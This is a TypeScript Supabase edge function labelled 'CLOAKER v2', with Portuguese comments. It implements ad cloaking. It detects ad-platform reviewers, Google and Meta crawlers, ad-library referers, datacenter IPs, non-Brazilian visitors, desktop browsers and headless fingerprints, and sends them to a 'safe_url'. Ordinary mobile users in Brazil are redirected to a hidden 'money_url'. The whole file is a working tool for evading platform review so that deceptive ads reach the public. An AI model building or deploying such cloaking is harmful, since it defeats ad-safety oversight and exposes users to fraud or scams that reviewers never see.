import "jsr:@supabase/functions-js/edge-runtime.d.ts";

// ══════════════════════════════════════════════════════════════
// CLOAKER v2 — Edge Function REFORÇADA
// Detecção: UA + IP/CIDR + Geo + Referer + Rate Limit +
//           Multi-campaign tracking + JS Fingerprint scoring
// ══════════════════════════════════════════════════════════════

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
  "Access-Control-Allow-Headers": "Content-Type",
};

// ── Cache de campanhas em memória ──
const campaignCache = new Map<string, { data: Campaign; cachedAt: number }>();
const CACHE_TTL_MS = 60_000;

// ── Rate limiting em memória ──
const ipTracker = new Map<string, {
  count: number;
  firstSeen: number;
  campaigns: Set<string>;
  lastAccess: number;
}>();
const RATE_LIMIT_WINDOW_MS = 5 * 60 * 1000; // 5 minutos
const RATE_LIMIT_MAX = 10; // max 10 acessos por IP em 5 min
const MULTI_CAMPAIGN_THRESHOLD = 3; // 3+ campanhas diferentes = revisor

// ── Limpa entries antigas do rate limiter a cada 10 min ──
setInterval(() => {
  const now = Date.now();
  for (const [ip, data] of ipTracker) {
    if (now - data.lastAccess > RATE_LIMIT_WINDOW_MS * 2) {
      ipTracker.delete(ip);
    }
  }
}, 10 * 60 * 1000);

interface Campaign {
  id: string;
  slug: string;
  name: string;
  safe_url: string;
  money_url: string;
  is_active: boolean;
}

// ══════════════════════════════════════════════════════════════
// 1. DETECÇÃO POR USER-AGENT (~60 patterns)
// ══════════════════════════════════════════════════════════════
const BOT_UA_PATTERNS: RegExp[] = [
  // Google
  /googlebot/i, /adsbot-google/i, /google-safety/i, /mediapartners-google/i,
  /google-inspectiontool/i, /google-adwords/i, /google-read-aloud/i,
  /feedfetcher-google/i, /google\s?favicon/i, /googleweblight/i, /storebot-google/i,

  // Facebook / Meta
  /facebookexternalhit/i, /facebookbot/i, /facebot/i,
  /meta-externalagent/i, /meta-externalfetcher/i,

  // Microsoft / Bing
  /bingbot/i, /bingpreview/i, /msnbot/i, /adidxbot/i,

  // Social / Ads platforms
  /twitterbot/i, /linkedinbot/i, /pinterest/i, /slurp/i,
  /duckduckbot/i, /baiduspider/i, /yandexbot/i, /yandexmobilebot/i,
  /sogou/i, /exabot/i, /ia_archiver/i, /applebot/i,

  // SEO crawlers
  /semrushbot/i, /ahrefsbot/i, /mj12bot/i, /dotbot/i,
  /rogerbot/i, /screaming\s?frog/i, /sistrix/i, /seokicks/i,
  /petalbot/i, /bytespider/i,

  // Headless / Automação
  /headlesschrome/i, /phantomjs/i, /puppeteer/i, /playwright/i,
  /selenium/i, /webdriver/i, /chrome-lighthouse/i, /lighthouse/i,
  /gtmetrix/i, /pagespeed/i, /PTST/i,

  // HTTP clients / bots genéricos
  /wget/i, /curl\//i, /python-requests/i, /python-urllib/i,
  /go-http-client/i, /java\//i, /axios\//i, /node-fetch/i,
  /http\.rb/i, /libwww-perl/i, /apache-httpclient/i, /okhttp/i,
  /httpie/i, /postman/i, /insomnia/i, /undici/i,

  // Catch-all (keep last - broader patterns)
  /bot[\s\/;,)]/i, /crawl/i, /spider/i, /scrape/i,
];

// ══════════════════════════════════════════════════════════════
// 2. DETECÇÃO POR IP (CIDR ranges de datacenters)
// ══════════════════════════════════════════════════════════════
interface CIDRRange { network: number; mask: number; label: string; }

function parseCIDR(cidr: string, label: string): CIDRRange {
  const [ip, bits] = cidr.split("/");
  const parts = ip.split(".").map(Number);
  const network = ((parts[0] << 24) | (parts[1] << 16) | (parts[2] << 8) | parts[3]) >>> 0;
  const mask = (~0 << (32 - Number(bits))) >>> 0;
  return { network: (network & mask) >>> 0, mask, label };
}

const BOT_IP_RANGES: CIDRRange[] = [
  // Google
  parseCIDR("66.249.64.0/19", "google"), parseCIDR("64.233.160.0/19", "google"),
  parseCIDR("209.85.128.0/17", "google"), parseCIDR("216.239.32.0/19", "google"),
  parseCIDR("72.14.192.0/18", "google"), parseCIDR("74.125.0.0/16", "google"),
  parseCIDR("108.177.8.0/21", "google"), parseCIDR("173.194.0.0/16", "google"),
  parseCIDR("142.250.0.0/15", "google"), parseCIDR("35.190.0.0/17", "google"),
  parseCIDR("35.191.0.0/16", "google"),

  // Facebook / Meta
  parseCIDR("69.63.176.0/20", "meta"), parseCIDR("69.171.224.0/19", "meta"),
  parseCIDR("66.220.144.0/20", "meta"), parseCIDR("31.13.24.0/21", "meta"),
  parseCIDR("31.13.64.0/18", "meta"), parseCIDR("157.240.0.0/16", "meta"),
  parseCIDR("179.60.192.0/22", "meta"), parseCIDR("185.60.216.0/22", "meta"),
  parseCIDR("204.15.20.0/22", "meta"), parseCIDR("102.132.96.0/20", "meta"),
  parseCIDR("163.70.128.0/17", "meta"),

  // Microsoft / Bing
  parseCIDR("40.77.167.0/24", "microsoft"), parseCIDR("207.46.0.0/16", "microsoft"),
  parseCIDR("65.52.0.0/14", "microsoft"), parseCIDR("157.55.0.0/16", "microsoft"),
  parseCIDR("157.56.0.0/16", "microsoft"), parseCIDR("52.160.0.0/11", "microsoft"),
  parseCIDR("13.64.0.0/11", "microsoft"), parseCIDR("20.33.0.0/16", "microsoft"),

  // AWS (ranges mais comuns)
  parseCIDR("54.236.0.0/15", "aws"), parseCIDR("54.208.0.0/15", "aws"),
  parseCIDR("52.0.0.0/11", "aws"), parseCIDR("18.204.0.0/14", "aws"),
  parseCIDR("3.208.0.0/12", "aws"), parseCIDR("34.192.0.0/10", "aws"),

  // GCP
  parseCIDR("35.184.0.0/13", "gcp"), parseCIDR("35.192.0.0/11", "gcp"),
  parseCIDR("34.64.0.0/10", "gcp"), parseCIDR("104.196.0.0/14", "gcp"),

  // DigitalOcean
  parseCIDR("104.131.0.0/16", "digitalocean"), parseCIDR("159.65.0.0/16", "digitalocean"),
  parseCIDR("167.99.0.0/16", "digitalocean"), parseCIDR("206.189.0.0/16", "digitalocean"),

  // OVH
  parseCIDR("51.68.0.0/16", "ovh"), parseCIDR("51.75.0.0/16", "ovh"),
  parseCIDR("51.77.0.0/16", "ovh"), parseCIDR("51.79.0.0/16", "ovh"),
  parseCIDR("54.36.0.0/16", "ovh"),

  // Hetzner
  parseCIDR("95.216.0.0/16", "hetzner"), parseCIDR("135.181.0.0/16", "hetzner"),
  parseCIDR("65.108.0.0/16", "hetzner"), parseCIDR("65.109.0.0/16", "hetzner"),

  // Vultr
  parseCIDR("45.32.0.0/16", "vultr"), parseCIDR("108.61.0.0/16", "vultr"),
  parseCIDR("207.246.0.0/16", "vultr"),

  // Linode
  parseCIDR("45.33.0.0/17", "linode"), parseCIDR("45.56.0.0/16", "linode"),
  parseCIDR("50.116.0.0/16", "linode"), parseCIDR("139.162.0.0/16", "linode"),
];

function ipToNumber(ip: string): number {
  const parts = ip.split(".").map(Number);
  if (parts.length !== 4 || parts.some((p) => isNaN(p) || p < 0 || p > 255)) return 0;
  return ((parts[0] << 24) | (parts[1] << 16) | (parts[2] << 8) | parts[3]) >>> 0;
}

function isIPInRanges(ip: string): { match: boolean; label: string } {
  const ipNum = ipToNumber(ip);
  if (ipNum === 0) return { match: false, label: "" };
  for (const range of BOT_IP_RANGES) {
    if (((ipNum & range.mask) >>> 0) === range.network) {
      return { match: true, label: range.label };
    }
  }
  return { match: false, label: "" };
}

// ══════════════════════════════════════════════════════════════
// 3. DETECÇÃO POR REFERER (reviewers / ad libraries)
// ══════════════════════════════════════════════════════════════
const SUSPICIOUS_REFERER_PATTERNS: RegExp[] = [
  /facebook\.com\/ads/i,
  /business\.facebook/i,
  /developers\.facebook/i,
  /transparency\.fb/i,
  /adlibrary/i,
  /ads\.google/i,
  /adstransparency/i,
  /similarweb/i,
  /spyfu/i,
  /adspy/i,
  /bigspy/i,
  /poweradspy/i,
  /dropispy/i,
  /adbeat/i,
  /socialpeta/i,
  /admagic/i,
];

function isSuspiciousReferer(referer: string): { suspicious: boolean; pattern: string } {
  if (!referer) return { suspicious: false, pattern: "" };
  for (const pattern of SUSPICIOUS_REFERER_PATTERNS) {
    if (pattern.test(referer)) {
      return { suspicious: true, pattern: referer.match(pattern)?.[0] || "unknown" };
    }
  }
  return { suspicious: false, pattern: "" };
}

// ══════════════════════════════════════════════════════════════
// 4. HEADERS FINGERPRINT (missing browser headers = bot)
// ══════════════════════════════════════════════════════════════
function checkBrowserHeaders(req: Request): { suspicious: boolean; reason: string } {
  const acceptLang = req.headers.get("accept-language");
  const accept = req.headers.get("accept");
  const secFetchMode = req.headers.get("sec-fetch-mode");
  const secFetchSite = req.headers.get("sec-fetch-site");

  // Real browsers always send accept-language
  if (!acceptLang) {
    return { suspicious: true, reason: "no-accept-language" };
  }

  // Real browsers send accept with text/html for page navigations
  if (!accept || !accept.includes("text/html")) {
    return { suspicious: true, reason: "no-accept-html" };
  }

  return { suspicious: false, reason: "" };
}

// ══════════════════════════════════════════════════════════════
// 5. RATE LIMITING & MULTI-CAMPAIGN DETECTION
// ══════════════════════════════════════════════════════════════
function checkRateLimit(ip: string, campaignSlug: string): { blocked: boolean; reason: string } {
  const now = Date.now();
  let record = ipTracker.get(ip);

  if (!record) {
    record = { count: 1, firstSeen: now, campaigns: new Set([campaignSlug]), lastAccess: now };
    ipTracker.set(ip, record);
    return { blocked: false, reason: "" };
  }

  // Reset window if expired
  if (now - record.firstSeen > RATE_LIMIT_WINDOW_MS) {
    record.count = 1;
    record.firstSeen = now;
    record.campaigns = new Set([campaignSlug]);
    record.lastAccess = now;
    return { blocked: false, reason: "" };
  }

  record.count++;
  record.campaigns.add(campaignSlug);
  record.lastAccess = now;

  // Multi-campaign access = likely reviewer
  if (record.campaigns.size >= MULTI_CAMPAIGN_THRESHOLD) {
    return { blocked: true, reason: `multi-campaign:${record.campaigns.size}` };
  }

  // Rate limit exceeded
  if (record.count > RATE_LIMIT_MAX) {
    return { blocked: true, reason: `rate-limit:${record.count}/${RATE_LIMIT_MAX}` };
  }

  return { blocked: false, reason: "" };
}

// ══════════════════════════════════════════════════════════════
// 6. JS FINGERPRINT SCORING (recebido via POST)
// ══════════════════════════════════════════════════════════════
interface FingerprintData {
  webdriver: boolean;
  plugins: number;
  languages: number;
  screenW: number;
  screenH: number;
  outerW: number;
  outerH: number;
  colorDepth: number;
  hardwareConcurrency: number;
  touchPoints: number;
  webglRenderer: string;
  hasFocus: boolean;
  hasChrome: boolean;
  loadTimeMs: number;
  timezone: string;
  platform: string;
  cookiesEnabled: boolean;
  doNotTrack: string;
}

function scoreFingerprintData(fp: FingerprintData, userAgent: string): { score: number; reasons: string[] } {
  let score = 0; // 0 = humano, positivo = mais suspeito
  const reasons: string[] = [];

  // WebDriver flag (dead giveaway)
  if (fp.webdriver) {
    score += 50;
    reasons.push("webdriver=true");
  }

  // No plugins (headless Chrome has 0)
  if (fp.plugins === 0) {
    score += 15;
    reasons.push("plugins=0");
  }

  // No languages
  if (fp.languages === 0) {
    score += 15;
    reasons.push("languages=0");
  }

  // Suspicious screen dimensions
  if (fp.screenW === 0 || fp.screenH === 0) {
    score += 20;
    reasons.push(`screen=${fp.screenW}x${fp.screenH}`);
  } else if (fp.screenW === 800 && fp.screenH === 600) {
    score += 10;
    reasons.push("screen=800x600(default)");
  }

  // outerWidth/outerHeight = 0 (headless)
  if (fp.outerW === 0 || fp.outerH === 0) {
    score += 20;
    reasons.push("outer=0");
  }

  // WebGL renderer = SwiftShader or Mesa (headless Chrome)
  const renderer = (fp.webglRenderer || "").toLowerCase();
  if (renderer.includes("swiftshader") || renderer.includes("mesa") || renderer.includes("llvmpipe")) {
    score += 25;
    reasons.push(`webgl:${renderer.substring(0, 30)}`);
  }

  // No focus (headless browsers)
  if (!fp.hasFocus) {
    score += 5;
    reasons.push("no-focus");
  }

  // Chrome UA but no window.chrome object
  if (/chrome/i.test(userAgent) && !fp.hasChrome) {
    score += 15;
    reasons.push("no-chrome-obj");
  }

  // Page loaded too fast (< 500ms = likely bot pre-rendering)
  if (fp.loadTimeMs > 0 && fp.loadTimeMs < 300) {
    score += 10;
    reasons.push(`fast-load:${fp.loadTimeMs}ms`);
  }

  // Mobile UA but no touch
  if (/mobile|android|iphone/i.test(userAgent) && fp.touchPoints === 0) {
    score += 15;
    reasons.push("mobile-no-touch");
  }

  // Cookies disabled
  if (!fp.cookiesEnabled) {
    score += 5;
    reasons.push("no-cookies");
  }

  // Hardware concurrency = 0 or very unusual
  if (fp.hardwareConcurrency === 0) {
    score += 10;
    reasons.push("hw-concurrency=0");
  }

  // ── MOBILE-ONLY ENFORCEMENT ──
  // Campaign targets mobile only. Desktop = reviewer/bot.

  // No touch support = desktop/bot (all modern phones have touch)
  if (fp.touchPoints === 0) {
    score += 20;
    reasons.push("no-touch");
  }

  // Desktop platform (Win32, Linux x86_64, MacIntel)
  const plat = (fp.platform || "").toLowerCase();
  if (plat.includes("win") || plat.includes("linux x86") || plat.includes("macintel")) {
    // Only flag if UA claims to be mobile (spoofing) or is desktop
    if (!/mobile|android|iphone/i.test(userAgent)) {
      score += 25;
      reasons.push(`desktop-platform:${plat}`);
    }
  }

  // Large screen = desktop (mobile rarely exceeds 480px width in portrait)
  // Note: screen.width on mobile reports device pixels
  if (fp.screenW > 1024 && fp.touchPoints === 0) {
    score += 15;
    reasons.push(`large-screen:${fp.screenW}x${fp.screenH}`);
  }

  // Desktop UA without mobile keywords
  if (!/mobile|android|iphone|ipad|ipod/i.test(userAgent) && !/bot|crawl|spider/i.test(userAgent)) {
    score += 10;
    reasons.push("desktop-ua");
  }

  return { score, reasons };
}

// ══════════════════════════════════════════════════════════════
// ANÁLISE COMPLETA — combina todas as camadas
// ══════════════════════════════════════════════════════════════
interface VerdictResult {
  verdict: "bot" | "human";
  reason: string;
}

function analyzeServerSide(
  userAgent: string,
  ip: string,
  referer: string,
  country: string,
  campaignSlug: string,
  req: Request
): VerdictResult {
  // 1) User-Agent vazio
  if (!userAgent || userAgent.trim() === "") {
    return { verdict: "bot", reason: "ua:empty" };
  }

  // 2) User-Agent match
  for (const pattern of BOT_UA_PATTERNS) {
    if (pattern.test(userAgent)) {
      const matchStr = userAgent.match(pattern)?.[0] || "unknown";
      return { verdict: "bot", reason: `ua:${matchStr}` };
    }
  }

  // 3) IP em range de datacenter
  const ipCheck = isIPInRanges(ip);
  if (ipCheck.match) {
    return { verdict: "bot", reason: `ip:${ipCheck.label}(${ip})` };
  }

  // 4) Geo-filter: não é BR → safe page
  if (country && country.toUpperCase() !== "BR" && country.toUpperCase() !== "XX" && country !== "") {
    return { verdict: "bot", reason: `geo:${country}` };
  }

  // 5) Referer suspeito (ad spy tools, ad library)
  const refCheck = isSuspiciousReferer(referer);
  if (refCheck.suspicious) {
    return { verdict: "bot", reason: `ref:${refCheck.pattern}` };
  }

  // 6) Headers de browser ausentes
  const headerCheck = checkBrowserHeaders(req);
  if (headerCheck.suspicious) {
    return { verdict: "bot", reason: `hdr:${headerCheck.reason}` };
  }

  // 7) Rate limiting & multi-campaign
  const rateCheck = checkRateLimit(ip, campaignSlug);
  if (rateCheck.blocked) {
    return { verdict: "bot", reason: rateCheck.reason };
  }

  // 8) MOBILE-ONLY: Desktop UA → safe page
  // Campaign targets mobile only. If UA doesn't have mobile keywords → reviewer/bot on desktop
  const isMobileUA = /mobile|android|iphone|ipad|ipod|opera\s?mini|iemobile|wpdesktop/i.test(userAgent);
  const isDesktopIndicator = /windows\s?nt|macintosh|mac\s?os\s?x|linux\s?x86|cros\s/i.test(userAgent);
  if (!isMobileUA && isDesktopIndicator) {
    return { verdict: "bot", reason: `desktop-ua:mobile-only` };
  }

  // Passou em tudo → humano (server-side)
  return { verdict: "human", reason: "server-passed" };
}

// ══════════════════════════════════════════════════════════════
// SUPABASE HELPERS
// ══════════════════════════════════════════════════════════════
function getSupabaseConfig() {
  const url = Deno.env.get("SUPABASE_URL");
  const key = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY");
  return { url, key };
}

async function fetchCampaign(slug: string): Promise<Campaign | null> {
  const cached = campaignCache.get(slug);
  if (cached && Date.now() - cached.cachedAt < CACHE_TTL_MS) {
    return cached.data;
  }
  const { url, key } = getSupabaseConfig();
  if (!url || !key) return null;
  try {
    const res = await fetch(
      `${url}/rest/v1/cloak_campaigns?slug=eq.${encodeURIComponent(slug)}&is_active=eq.true&select=*&limit=1`,
      { headers: { apikey: key, Authorization: `Bearer ${key}` } }
    );
    const rows = await res.json();
    if (!Array.isArray(rows) || rows.length === 0) return null;
    const campaign = rows[0] as Campaign;
    campaignCache.set(slug, { data: campaign, cachedAt: Date.now() });
    return campaign;
  } catch (err) {
    console.error("[CLOAK] Failed to fetch campaign:", err);
    return null;
  }
}

async function logAccess(log: {
  campaign_id: string | null;
  ip: string;
  user_agent: string;
  referer: string;
  country: string;
  verdict: string;
  reason: string;
  redirected_to: string;
  query_params: string;
}): Promise<void> {
  const { url, key } = getSupabaseConfig();
  if (!url || !key) return;
  try {
    await fetch(`${url}/rest/v1/cloak_logs`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        apikey: key,
        Authorization: `Bearer ${key}`,
        Prefer: "return=minimal",
      },
      body: JSON.stringify(log),
    });
  } catch (err) {
    console.error("[CLOAK] Failed to log:", err);
  }
}

// ══════════════════════════════════════════════════════════════
// REQUEST HANDLER
// ══════════════════════════════════════════════════════════════
const FP_SCORE_THRESHOLD = 25; // score >= 25 → bot

Deno.serve(async (req: Request) => {
  if (req.method === "OPTIONS") {
    return new Response(null, { status: 204, headers: corsHeaders });
  }

  try {
    const url = new URL(req.url);

    // Extract common headers
    const userAgent = req.headers.get("user-agent") || "";
    const referer = req.headers.get("referer") || "";
    const country =
      req.headers.get("cf-ipcountry") ||
      req.headers.get("x-vercel-ip-country") ||
      req.headers.get("x-country-code") || "";
    const ip =
      req.headers.get("x-real-ip") ||
      req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() ||
      req.headers.get("cf-connecting-ip") || "0.0.0.0";

    // ════════════════════════════════════════════════════
    // POST — Recebe fingerprint do JS e decide
    // ════════════════════════════════════════════════════
    if (req.method === "POST") {
      const body = await req.json();
      const slug = body.slug || url.searchParams.get("c") || "";

      if (!slug) {
        return new Response(JSON.stringify({ error: "missing slug" }), {
          status: 400,
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        });
      }

      const campaign = await fetchCampaign(slug);
      if (!campaign) {
        return new Response(JSON.stringify({ error: "campaign not found" }), {
          status: 404,
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        });
      }

      // Server-side analysis
      const serverResult = analyzeServerSide(userAgent, ip, referer, country, slug, req);

      let finalVerdict = serverResult.verdict;
      let finalReason = serverResult.reason;

      // If server says human, also check JS fingerprint
      if (finalVerdict === "human" && body.fp) {
        const fpResult = scoreFingerprintData(body.fp as FingerprintData, userAgent);
        if (fpResult.score >= FP_SCORE_THRESHOLD) {
          finalVerdict = "bot";
          finalReason = `fp:score=${fpResult.score}(${fpResult.reasons.join(",")})`;
        } else {
          finalReason = `human:fp=${fpResult.score}`;
        }
      }

      // Decide target URL
      let targetUrl: string;
      if (finalVerdict === "bot") {
        targetUrl = campaign.safe_url;
      } else {
        targetUrl = campaign.money_url;
        // Append original UTMs
        if (body.params) {
          try {
            const moneyUrl = new URL(targetUrl);
            const originalParams = new URLSearchParams(body.params);
            for (const [k, v] of originalParams.entries()) {
              if (k !== "c" && k !== "slug") {
                moneyUrl.searchParams.set(k, v);
              }
            }
            targetUrl = moneyUrl.toString();
          } catch { /* ignore URL parse errors */ }
        }
      }

      console.log(
        `[CLOAKv2] POST slug=${slug} verdict=${finalVerdict} reason=${finalReason} ip=${ip}`
      );

      // Log async
      EdgeRuntime.waitUntil(
        logAccess({
          campaign_id: campaign.id, ip, user_agent: userAgent, referer, country,
          verdict: finalVerdict, reason: finalReason, redirected_to: targetUrl,
          query_params: body.params || "",
        })
      );

      return new Response(JSON.stringify({
        url: targetUrl,
        verdict: finalVerdict,
      }), {
        status: 200,
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    // ════════════════════════════════════════════════════
    // GET — Redirect direto (fallback / bots sem JS)
    // ════════════════════════════════════════════════════
    if (req.method !== "GET") {
      return new Response("Method not allowed", { status: 405, headers: corsHeaders });
    }

    const slug = url.searchParams.get("c");
    if (!slug) {
      return new Response("Missing campaign", { status: 400, headers: corsHeaders });
    }

    const campaign = await fetchCampaign(slug);
    if (!campaign) {
      return new Response("Not found", { status: 404, headers: corsHeaders });
    }

    // Server-side analysis only (no JS fingerprint on GET)
    const result = analyzeServerSide(userAgent, ip, referer, country, slug, req);

    let targetUrl: string;
    if (result.verdict === "bot") {
      targetUrl = campaign.safe_url;
    } else {
      targetUrl = campaign.money_url;
      const moneyUrl = new URL(targetUrl);
      for (const [k, v] of url.searchParams.entries()) {
        if (k !== "c") moneyUrl.searchParams.set(k, v);
      }
      targetUrl = moneyUrl.toString();
    }

    console.log(
      `[CLOAKv2] GET slug=${slug} verdict=${result.verdict} reason=${result.reason} ip=${ip}`
    );

    EdgeRuntime.waitUntil(
      logAccess({
        campaign_id: campaign.id, ip, user_agent: userAgent, referer, country,
        verdict: result.verdict, reason: result.reason, redirected_to: targetUrl,
        query_params: url.search || "",
      })
    );

    return new Response(null, {
      status: 302,
      headers: {
        ...corsHeaders,
        Location: targetUrl,
        "Cache-Control": "no-store, no-cache, must-revalidate, proxy-revalidate",
        Pragma: "no-cache",
        Expires: "0",
      },
    });
  } catch (err) {
    console.error("[CLOAKv2] Error:", err);
    return new Response("Internal error", { status: 500, headers: corsHeaders });
  }
});
